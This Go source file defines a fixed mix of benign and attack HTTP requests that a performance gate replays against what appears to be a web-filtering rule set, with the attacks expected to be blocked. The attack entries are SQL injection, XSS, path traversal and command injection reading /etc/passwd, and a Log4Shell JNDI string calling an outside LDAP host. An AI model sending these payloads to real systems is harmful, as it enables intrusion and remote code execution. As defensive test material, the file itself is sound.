// Package perf holds the fixed request mix the performance gate replays, so
// two builds are measured against the same work.
package perf

import (
	"strconv"
	"strings"
)

// Case is one request in the mix. Blocked records whether the rule set is
// expected to refuse it; the mix test holds that expectation.
type Case struct {
	Name    string
	Method  string
	Target  string
	Body    string
	Type    string
	UA      string
	Blocked bool
}

const browserUA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

// variants is how many numbered copies of each template the mix holds.
const variants = 16

var benign = []Case{
	{Name: "home", Method: "GET", Target: "/"},
	{Name: "product", Method: "GET", Target: "/products?page={n}&sort=price"},
	{Name: "search", Method: "GET", Target: "/search?q=router+table+{n}"},
	{Name: "asset", Method: "GET", Target: "/assets/app.{n}.css"},
	{Name: "api", Method: "GET", Target: "/api/items?limit=25&offset={n}"},
	{Name: "form", Method: "POST", Target: "/contact", Type: "application/x-www-form-urlencoded",
		Body: "name=Ada&email=ada%40example.com&message=hello+number+{n}"},
	{Name: "login", Method: "POST", Target: "/login", Type: "application/x-www-form-urlencoded",
		Body: "user=ada&password=correct+horse+{n}"},
	{Name: "session", Method: "GET", Target: "/account?tab=orders&page={n}"},
}

var attacks = []Case{
	{Name: "sqli", Method: "GET", Target: "/item?id=1%27+OR+%271%27%3D%271", Blocked: true},
	{Name: "xss", Method: "GET", Target: "/q?q=%3Cscript%3Ealert({n})%3C%2Fscript%3E", Blocked: true},
	{Name: "traversal", Method: "GET", Target: "/download?file=../../../../etc/passwd", Blocked: true},
	{Name: "rce", Method: "GET", Target: "/run?cmd=%3Bcat+%2Fetc%2Fpasswd", Blocked: true},
	{Name: "log4shell", Method: "GET", Target: "/",
		UA: "${jndi:ldap://198.51.100.9:1389/a}", Blocked: true},
	{Name: "form-sqli", Method: "POST", Target: "/login", Type: "application/x-www-form-urlencoded",
		Body: "user=admin%27--&password=x", Blocked: true},
}

// Mix returns the same requests, in the same order, on every call.
func Mix() []Case {
	out := make([]Case, 0, (len(benign)+len(attacks))*variants)
	for i := 0; i < variants; i++ {
		for _, c := range benign {
			out = append(out, numbered(c, i))
		}
		for _, c := range attacks {
			out = append(out, numbered(c, i))
		}
	}
	return out
}

func numbered(c Case, i int) Case {
	n := strconv.Itoa(i)
	c.Name = c.Name + "-" + n
	c.Target = strings.ReplaceAll(c.Target, "{n}", n)
	c.Body = strings.ReplaceAll(c.Body, "{n}", n)
	if c.UA == "" {
		c.UA = browserUA
	}
	return c
}
